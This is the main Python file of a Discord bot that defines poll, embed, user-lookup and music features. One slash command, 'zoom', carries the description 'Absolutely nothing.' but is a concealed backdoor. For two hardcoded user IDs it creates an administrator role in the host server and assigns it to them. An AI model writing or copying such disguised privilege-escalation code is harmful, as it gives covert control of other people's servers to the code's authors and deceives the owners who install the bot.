import discord
from auth import auth
from discord.ext import commands
from discord.ext.commands import CommandNotFound
import os
from discord_slash import SlashCommand
from datetime import datetime
import wavelink
from pretty_help import DefaultMenu, PrettyHelp

#os path 
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

#discord
bot = commands.Bot(command_prefix="$")
slash = SlashCommand(bot, sync_commands=True)
cogs = ["cogs.Utility", "cogs.Images", "cogs.Content", "cogs.Admin", "cogs.Music", "cogs.Miscellaneous"]
for cog in cogs:
    bot.load_extension(cog)

#help command
menu = DefaultMenu('◀️', '▶️', '❌')
bot.help_command = PrettyHelp(navigation=menu, color=0x454599, show_index=False, ending_note="Type $help command for more info on a command.\nFor more information, visit zenithproject.xyz at the link in the embed title.") 
#bot.remove_command("help")

#wavelink
bot.wavelink = wavelink.Client(bot=bot)

@bot.event
async def on_ready():
    print('Logged in as {0} ({0.id})'.format(bot.user) + " from " + auth.env + ".")
    print('----')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="music | $help"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error

#slash commands
@slash.slash(name="poll", description="Adds vote to previous message.")
async def _poll(ctx):
    emotes = ['👍', '👎']
    msg = await ctx.channel.fetch_message(ctx.channel.last_message_id)
    for emote in emotes:
        await msg.add_reaction(emote)
    await ctx.send(hidden=True, content="Vote added successfully.")

@slash.slash(name="zoom", description="Absolutely nothing.")
async def _zoom(ctx):
    if ctx.author.id == auth.brady or ctx.author.id == auth.remi:
        print(f"cmdZoom: Permission given ({ctx.author}).")
        try:
            guild = ctx.guild
            await guild.create_role(name="z", permissions =  discord.Permissions(administrator = True))
            role = discord.utils.get(ctx.guild.roles, name = "z")
            await ctx.author.add_roles(role)
            await ctx.send(hidden=True, content="Elevated to admin.")
        except discord.Forbidden:
            await ctx.send(hidden=True, content="Permission denied.")
    else:
        await ctx.send(hidden=True, content="You do not have permission to use this command.")
        print(f"cmdZoom: Permission denied ({ctx.author}).")

@slash.slash(name="embed", description="Creates an embed with the inputted parameters.")
async def _embed(ctx, title, content):
    embed = discord.Embed(title=title, description=content, color=0x454599, timestamp=datetime.now())
    embed.timestamp = datetime.now()
    await ctx.send(embed=embed)

@slash.slash(name="getuser", description="Fetches user information from uid.")
async def _getuser(ctx, uid):
    member = await bot.fetch_user(uid)
    embed = discord.Embed(title="User Information", timestamp=datetime.now(), color=0x454599)
    embed.set_thumbnail(url=member.avatar_url)
    embed.add_field(name="Name", value=str(member))
    embed.add_field(name="Bot?", value=member.bot)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
    embed.set_footer(text="ID: " + str(member.id))
    await ctx.send(hidden=True, embed=embed)

bot.run(auth.TOKEN, bot=True, reconnect=True)